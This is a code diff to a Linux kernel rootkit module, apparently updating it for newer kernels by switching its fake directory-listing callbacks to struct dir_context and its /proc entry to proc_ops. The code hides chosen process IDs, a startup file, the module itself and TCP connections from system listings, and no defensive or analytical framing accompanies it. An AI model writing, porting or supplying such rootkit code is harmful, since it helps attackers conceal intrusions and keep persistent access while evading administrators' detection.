@@ -472,7 +472,7 @@ static ssize_t orders_handler (struct file *filp, const char __user *data, size_
     return -1;
 }
 
-int fake_proc_fill_dir(void *a, const char *buffer, int c, loff_t d, u64 e, unsigned f) {
+int fake_proc_fill_dir(struct dir_context *a, const char *buffer, int c, long long d, long long unsigned e, unsigned f) {
     unsigned i;
     for(i = 0; i < hidden_pid_count; ++i)
         if(!strcmp(buffer, hidden_pids[i]))
@@ -482,14 +482,14 @@ int fake_proc_fill_dir(void *a, const char *buffer, int c, loff_t d, u64 e, unsi
 }
 
 
-int fake_rc_fill_dir(void *a, const char *buffer, int c, loff_t d, u64 e, unsigned f) {
+int fake_rc_fill_dir(struct dir_context *a, const char *buffer, int c, long long d, long long unsigned e, unsigned f) {
     if(!strcmp(buffer, rc_name))
         return 0;
     // do the normal stuff...
     return rc_filldir->actor(a, buffer, c, d, e, f);
 }
 
-int fake_mod_fill_dir(void *a, const char *buffer, int c, loff_t d, u64 e, unsigned f) {
+int fake_mod_fill_dir(struct dir_context *a, const char *buffer, int c, loff_t d, u64 e, unsigned f) {
     if(!strcmp(buffer, mod_name))
         return 0;
     // do the normal stuff...
@@ -651,14 +651,14 @@ void init_hide_mod(void) {
 }
 
 static int __init module_init_proc(void) {
-    static struct file_operations fileops_struct = {0};
+    static struct proc_ops proc_ops_struct;
     struct proc_dir_entry *new_proc;
     // dummy to get proc_dir_entry of /proc
     if(rc_name && rc_dir)
         init_hide_rc();
     if(mod_name && mod_dir)
         init_hide_mod();
-    new_proc = proc_create("dummy", 0644, 0, &fileops_struct);
+    new_proc = proc_create("dummy", 0644, 0, &proc_ops_struct);
     root = new_proc->parent;
     
     init_tcp_hide_hook(root);
